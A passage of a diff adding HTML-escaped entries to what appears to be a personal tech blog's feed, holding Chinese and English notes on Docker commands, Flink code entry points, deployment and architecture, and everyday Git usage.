+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 用 fluentd 收集容器日志&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run -d &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> --log-driver&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>fluentd &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> --log-opt fluentd-address&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">${&lt;/span>&lt;span style="color:#000">fluentd_address&lt;/span>&lt;span style="color:#4e9a06">}&lt;/span> &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> --log-opt &lt;span style="color:#000">tag&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;docker.{{.Name}}&amp;#34;&lt;/span> &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span>nginx
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>OPTIONS说明：&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>-f :&lt;/strong> 跟踪日志输出&lt;/li>
+&lt;li>**&amp;ndash;since :**显示某个开始时间的所有日志&lt;/li>
+&lt;li>&lt;strong>-t :&lt;/strong> 显示时间戳&lt;/li>
+&lt;li>**&amp;ndash;tail :**仅列出最新N条容器日志&lt;/li>
+&lt;/ul>
+&lt;h3 id="docker-引擎日志">Docker 引擎日志&lt;/h3>
+&lt;p>Ubuntu(14.04) /var/log/upstart/docker.log
+Ubuntu(16.04) journalctl -u docker.service
+CentOS 7/RHEL 7/Fedora journalctl -u docker.service
+CoreOS journalctl -u docker.service
+OpenSuSE journalctl -u docker.service
+OSX ~/Library/Containers/com.docker.docker/Data/com.docker.driver.amd64-linux/log/docker.log
+Debian GNU/Linux 7 /var/log/daemon.log
+Debian GNU/Linux 8 journalctl -u docker.service
+Boot2Docker /var/log/docker.log&lt;/p>
+&lt;h2 id="events">events&lt;/h2>
+&lt;p>从服务器获取实时事件&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker events &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>OPTIONS说明：&lt;/p>
+&lt;ul>
+&lt;li>**-f ：**根据条件过滤事件；&lt;/li>
+&lt;li>**&amp;ndash;since ：**从指定的时间戳后显示所有事件; &amp;ndash;since=&amp;ldquo;2016-07-01&amp;rdquo;&lt;/li>
+&lt;li>**&amp;ndash;until ：**流水时间显示到指定的时间为止；&lt;/li>
+&lt;/ul>
+&lt;h2 id="export">export&lt;/h2>
+&lt;p>将文件系统作为一个tar归档文件导出到STDOUT。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker &lt;span style="color:#204a87">export&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> CONTAINER
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>OPTIONS说明：&lt;/p>
+&lt;ul>
+&lt;li>**-o :**将输入内容写到文件。&lt;/li>
+&lt;/ul>
+&lt;h2 id="wait">wait&lt;/h2>
+&lt;p>阻塞运行直到容器停止，然后打印出它的退出代码。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker &lt;span style="color:#204a87">wait&lt;/span> CONTAINER &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>CONTAINER...&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="port">port&lt;/h2>
+&lt;p>列出指定的容器的端口映射，或者查找将PRIVATE_PORT NAT到面向公众的端口&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker port CONTAINER &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>PRIVATE_PORT&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>/PROTO&lt;span style="color:#ce5c00;font-weight:bold">]]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="heading">$&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Delete all containers&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker rm &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>docker ps -a -q&lt;span style="color:#204a87;font-weight:bold">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Delete all images&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker rmi &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>docker images -q&lt;span style="color:#204a87;font-weight:bold">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="varlibdocker">&lt;code>/var/lib/docker&lt;/code>&lt;/h2>
+&lt;ol>
+&lt;li>/var/lib/docker/devicemapper/devicemapper/data #用来存储相关的存储池数据&lt;/li>
+&lt;li>/var/lib/docker/devicemapper/devicemapper/metadata #用来存储相关的元数据。&lt;/li>
+&lt;li>/var/lib/docker/devicemapper/metadata/ #用来存储 device_id. 大小. 以及传输_id. 初始化信息&lt;/li>
+&lt;li>/var/lib/docker/devicemapper/mnt #用来存储挂载信息&lt;/li>
+&lt;li>/var/lib/docker/container/ #用来存储容器信息&lt;/li>
+&lt;li>/var/lib/docker/graph/ #用来存储镜像中间件及本身详细信息和大小 . 以及依赖信息&lt;/li>
+&lt;li>/var/lib/docker/repositores-devicemapper #用来存储镜像基本信息&lt;/li>
+&lt;li>/var/lib/docker/tmp #docker临时目录&lt;/li>
+&lt;li>/var/lib/docker/trust #docker信任目录&lt;/li>
+&lt;li>/var/lib/docker/volumes #docker卷目录&lt;/li>
+&lt;/ol></description></item><item><title>Note: Flink Code</title><link>/note/bigdata/flink/flink-code/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/bigdata/flink/flink-code/</guid><description>
+&lt;h2 id="flink-client">&lt;code>flink-client&lt;/code>&lt;/h2>
+&lt;h3 id="clifrontend">CliFrontend&lt;/h3>
+&lt;blockquote>
+&lt;p>build StreamGraph&lt;/p>
+&lt;p>org.apache.flink.client.cli.CliFrontend#main&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">FLINK_CONF_DIR&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>./flink-dist/src/main/resources
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># submit a job&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>run ./flink-examples/flink-examples-streaming/target/WordCount.jar
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="flink-runtime">&lt;code>flink-runtime&lt;/code>&lt;/h2>
+&lt;h3 id="standalonesessionclusterentrypoint">StandaloneSessionClusterEntrypoint&lt;/h3>
+&lt;blockquote>
+&lt;p>run JobManager&lt;/p>
+&lt;p>org.apache.flink.runtime.entrypoint.StandaloneSessionClusterEntrypoint&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>-c ./flink-dist/src/main/resources
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Flink Deploy</title><link>/note/bigdata/flink/flink-deploy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/bigdata/flink/flink-deploy/</guid><description>
+&lt;h2 id="cluster">Cluster&lt;/h2>
+&lt;h3 id="starting-a-session-cluster-on-docker">Starting a Session Cluster on Docker&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># https://ci.apache.org/projects/flink/flink-docs-master/docs/deployment/resource-providers/standalone/docker/#starting-a-session-cluster-on-docker&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">FLINK_PROPERTIES&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;jobmanager.rpc.address: flink-jobmanager&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker network create flink
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># launch the JobManager&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run -d &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> --name&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>flink-jobmanager &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> --network flink &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> --publish 8081:8081 &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> --env &lt;span style="color:#000">FLINK_PROPERTIES&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#4e9a06">${&lt;/span>&lt;span style="color:#000">FLINK_PROPERTIES&lt;/span>&lt;span style="color:#4e9a06">}&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span> &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> flink jobmanager
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># one or more TaskManager containers &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run -d &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> --name&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>flink-taskmanager1 &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> --network flink &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> --env &lt;span style="color:#000">FLINK_PROPERTIES&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#4e9a06">${&lt;/span>&lt;span style="color:#000">FLINK_PROPERTIES&lt;/span>&lt;span style="color:#4e9a06">}&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span> &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> flink taskmanager
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># submit a task &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>./bin/flink run ./examples/streaming/TopSpeedWindowing.jar
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Flink Principle</title><link>/note/bigdata/flink/flink-principle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/bigdata/flink/flink-principle/</guid><description>
+&lt;h2 id="整体架构">整体架构&lt;/h2>
+&lt;p>Flink系统由&lt;code>Flink Program&lt;/code>、&lt;code>JobManager&lt;/code>、&lt;code>TaskManager&lt;/code>三个部分组成。这三部分之间都使用Akka框架(&lt;code>Actor System&lt;/code>)进行通信, 通过发送消息驱动任务的推进。&lt;/p>
+&lt;p>&lt;code>Flink Program&lt;/code> 加载用户提交的任务代码，解析并生成任务执行拓扑图，并将拓扑图提交给&lt;code>JobManager&lt;/code>。&lt;/p>
+&lt;p>&lt;code>JobManager&lt;/code>基于任务执行拓扑图，生成相应的物理执行计划，将执行计划发送给&lt;code>TaskManager&lt;/code>执行。除此之外，&lt;code>JobManager&lt;/code>还负责协调&lt;code>checkpoint&lt;/code>的生成，不断地从&lt;code>TaskManager&lt;/code>收集Operator的状态，并周期性生成&lt;code>checkpoint&lt;/code>，以便在系统出错时从&lt;code>checkpoint&lt;/code>恢复之前的状态。&lt;/p>
+&lt;p>&lt;code>TaskManager&lt;/code>负责管理任务执行所需的资源，执行具体的任务，并将任务产出的数据流传入给下一个任务。每个&lt;code>TaskManger&lt;/code>上运行一个jvm进程。每个&lt;code>TaskSlot&lt;/code>运行一个线程&lt;/p>
+&lt;h2 id="一致性保证与出错处理">一致性保证与出错处理&lt;/h2>
+&lt;p>分布式场景中，数据会丢失、会乱序、会重复。乱序的问题，结合&lt;code>Event Time&lt;/code> (表征事件发生的时间)与 &lt;code>Watermark&lt;/code>(表征何时数据已经完整的标识)解决。针对丢失和重复的问题，Flink通过分布式快照(&lt;code>distributed snapshot&lt;/code>),支持了&lt;code>Exactly Once&lt;/code>的一致性语义&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;h3 id="分布式快照">分布式快照&lt;/h3>
+&lt;/li>
+&lt;/ul>
+&lt;p>Flink基于&lt;code>Chandy and Lamport&lt;/code>算法,实现分布式快照机制&lt;/p>
+&lt;p>在正常的数据流中，Flink会周期性插入一种特殊的数据记录 - &lt;code>barrier&lt;/code>，当算子处理到&lt;code>barrier&lt;/code>的时候，会保存算子当前的状态到持久性存储。当算子包含多个输入的时候，需要对齐多个&lt;code>barrier&lt;/code>(align barriers)。当算子某个输入率先接收到&lt;code>barrier&lt;/code>的时候，会缓存该输入的后续数据，直到所有的输入都收到&lt;code>barrier&lt;/code>之后，才会触发状态备份操作，并输出&lt;code>barrier&lt;/code>到下游算子。&lt;/p>
+&lt;p>除了备份各个算子的状态生成snapshot之外，对于sink还需要执行一步额外操作 —— 将结果写入外部设备。Flink通过两阶段提交的机制(2PC,two-phase commit), 来实现这个分布式事务。&lt;/p>
+&lt;h2 id="流量控制">流量控制&lt;/h2>
+&lt;p>下游的&lt;code>InputChannel&lt;/code>从上游的&lt;code>ResultPartition&lt;/code>接收数据的时候，会基于当前已经缓存的数据量，以及可申请到的&lt;code>LocalBufferPool&lt;/code>与&lt;code>NetworkBufferPool&lt;/code>，计算出一个&lt;code>Credit&lt;/code>值返回给上游。上游基于&lt;code>Credit&lt;/code>的值，来决定发送多少数据。&lt;code>Credit&lt;/code>就像信用卡额度一样，不能超支。当下游发生数据拥塞时，&lt;code>Credit&lt;/code>减少值为0，于是上游停止数据发送。拥塞压力不断向上游传导，形成反压。&lt;/p></description></item><item><title>Note: Git</title><link>/note/ops/vcs/git/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/ops/vcs/git/</guid><description>
+&lt;h2 id="git">git&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># mkdir blog &amp;amp;&amp;amp; cd blog&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># git init&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># git remote add origin git@github.com:tukeof/tukeof.github.io.git&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git clone git://github.com/tukeof/tukeof.github.io.git blog
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">cd&lt;/span> blog
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git add *.md
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git commit -m &lt;span style="color:#4e9a06">&amp;#39;initial project version&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git push -u origin master
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="remote">remote&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 添加一个新的远程Git存储库&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git remote add &amp;lt;shortname&amp;gt; &amp;lt;url&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git remote add origin git@github.com:tukeof/tukeof.github.io.git
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git remote add origin ssh://username@127.0.0.1/reponame
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git remote -v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git remote update
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 也会改变所有远程跟踪分支名称&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git remote rename branch1 branch2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git remote rm branch1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git remote show origin
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 在本地新建一个tmp分支，并将远程origin仓库的master分支代码下载到本地tmp分支&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git fetch origin master:tmp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 比较本地代码与刚刚从远程下载下来的代码的区别&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git diff tmp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 合并temp分支到本地的master分支&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git merge tmp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 删除tmp分支&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git branch -d tmp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 取回远程主机某个分支的更新，再与本地的指定分支合并&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git pull origin master:&amp;lt;branch_name&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="add-rm-commit-log">add, rm, commit, log&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># -a，--all，自动暂存已修改和删除的文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git commit -a -m &lt;span style="color:#4e9a06">&amp;#39;message&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 从工作目录和暂存区域中删除文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git rm &amp;lt;file&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 仅从暂存区域中删除目录&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git rm -r -cached &amp;lt;dir&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git mv README.md README
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># mv README.md README&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># git rm README.md&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># git add README&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --amend&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 占用当前暂存区域并将其用于提交。如果自上次提交后没有进行任何更改，那么快照将看起来完全相同，并且将更改的是提交消息。&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git commit --amend
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 撤销对暂存区的更改&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git reset HEAD &amp;lt;file&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 丢弃工作目录中的更改&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git checkout - &amp;lt;file&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Git Checkout</title><link>/note/ops/vcs/git-checkout/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/ops/vcs/git-checkout/</guid><description>
+&lt;h2 id="branch">branch&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># list all branch, include local and remote&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git branch -a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># delete branch&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git branch -d &amp;lt;local_branch&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git push origin --delete &amp;lt;remote_branch&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># list tags&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git log --pretty&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>oneline --abbrev-commit
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git show &amp;lt;tag_name&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># tag a tag based on a commit, default cid is `HEAD`&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git tag &amp;lt;tag_name&amp;gt; &amp;lt;commit_id&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git tag -a &amp;lt;tag_name&amp;gt; -m &lt;span style="color:#4e9a06">&amp;#34;message for tag&amp;#34;&lt;/span> &amp;lt;commit_id&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># dangerous operation, it&amp;#39;s better no-modification until checkout to `HEAD` &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git checkout &amp;lt;tag_name&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git checkout -b &amp;lt;bra_name&amp;gt; &amp;lt;tag_name&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git tag -l &lt;span style="color:#4e9a06">&amp;#34;&amp;lt;prefix&amp;gt;*&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git push origin &amp;lt;tag_name&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># push all tags&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git push origin --tags
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># delete a local tag&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git tag -d &amp;lt;tag_name&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># delete a remote tag&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git push origin :refs/tags/&amp;lt;tag_name&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="stash">stash&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># list the stash entries that you currently have. stash@{0} is the latest entry&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git stash list
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># save all uncommitted changes&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git stash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># apply all uncommitted changes&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git stash apply
